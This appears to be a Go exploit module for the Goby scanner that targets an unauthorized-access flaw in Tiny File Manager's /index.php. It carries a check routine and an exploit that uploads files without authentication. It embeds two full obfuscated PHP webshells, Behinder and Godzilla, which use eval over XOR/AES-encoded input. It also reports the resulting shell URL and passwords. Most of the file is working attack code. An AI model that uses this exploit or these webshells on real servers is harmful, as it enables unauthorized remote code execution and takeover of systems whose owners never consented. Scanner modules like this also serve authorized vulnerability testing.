package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tiny-File-Manager /index.php Path Unauthorized Access Vulnerability",
    "Description": "<p>Tiny File Manager is a web-based open source file manager.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Product": "Tiny-File-Manager",
    "Homepage": "https://tinyfilemanager.github.io/",
    "DisclosureDate": "2023-03-20",
    "Author": "2075068490@qq.com",
    "FofaQuery": "body=\"Tiny File Manager\"",
    "GobyQuery": "body=\"Tiny File Manager\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/prasathmani/tinyfilemanager\">https://github.com/prasathmani/tinyfilemanager</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test68351.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "input the content",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Tiny-File-Manager /index.php 路径未授权访问漏洞",
            "Product": "Tiny-File-Manager",
            "Description": "<p>Tiny File Manager 是一款基于Web的开源文件管理器。<br></p><p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/prasathmani/tinyfilemanager\" target=\"_blank\">https://github.com/prasathmani/tinyfilemanager</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Tiny-File-Manager /index.php Path Unauthorized Access Vulnerability",
            "Product": "Tiny-File-Manager",
            "Description": "<p>Tiny File Manager is a web-based open source file manager.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://github.com/prasathmani/tinyfilemanager\" target=\"_blank\">https://github.com/prasathmani/tinyfilemanager</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10856"
}`
	sendPayload45151fgdfg := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/index.php")
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = true
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	uploadFilesByMultipart5551gfgdf := func(hostInfo *httpclient.FixUrl, fileName, content string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/index.php?p=")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------185501226640188579154160613100")
		postRequestConfig.Data = "-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"dzuuid\"\n\n4e233afa-d5c9-42fc-b8df-a511148b88f5\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"dzchunkindex\"\n\n0\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"dztotalfilesize\"\n\n29\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"dzchunksize\"\n\n10000000\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"dztotalchunkcount\"\n\n1\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"dzchunkbyteoffset\"\n\n0\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"p\"\n\n\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"fullpath\"\n\n" + fileName + "\n-----------------------------185501226640188579154160613100\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\nContent-Type: application/octet-stream\n\n" + content + "\n-----------------------------185501226640188579154160613100--"
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}
	checkFileExists65fgdfa := func(hostInfo *httpclient.FixUrl, uploadFileName string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/data/" + url.QueryEscape(uploadFileName))
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload45151fgdfg(hostInfo)
			return err == nil && resp != nil && resp.StatusCode != 401 && strings.Contains(resp.Utf8Html, "Full Size:") && strings.Contains(resp.Utf8Html, "File:")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := goutils.B2S(singleScanConfig.Params["filename"])
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			webshell := goutils.B2S(singleScanConfig.Params["webshell"])
			var content string
			if attackType != "webshell" && attackType != "custom" && attackType != "access" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			if attackType == "webshell" {
				fileName = goutils.RandomHexString(6) + ".php"
				if webshell == "behinder" {
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);echo "e165421110ba03099a1c0393373c5b43";?>`
				} else if webshell == "godzilla" {
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}echo "e165421110ba03099a1c0393373c5b43";?>`
				}
			} else if attackType == "custom" {
				content = goutils.B2S(singleScanConfig.Params["content"])
			}
			response, err := uploadFilesByMultipart5551gfgdf(expResult.HostInfo, fileName, content)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			if response.StatusCode != 200 && !strings.Contains(response.Utf8Html, "file upload successful") {
				expResult.Output = "不存在该漏洞"
				return expResult
			}
			resp, err := checkFileExists65fgdfa(expResult.HostInfo, fileName)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			} else if resp.StatusCode != 200 && !strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43") {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output = "File URL: " + expResult.HostInfo.FixedHostInfo + "/data/" + url.QueryEscape(fileName) + "\n"
				return expResult
			}
			expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/data/" + url.QueryEscape(fileName) + "\n"
			if webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
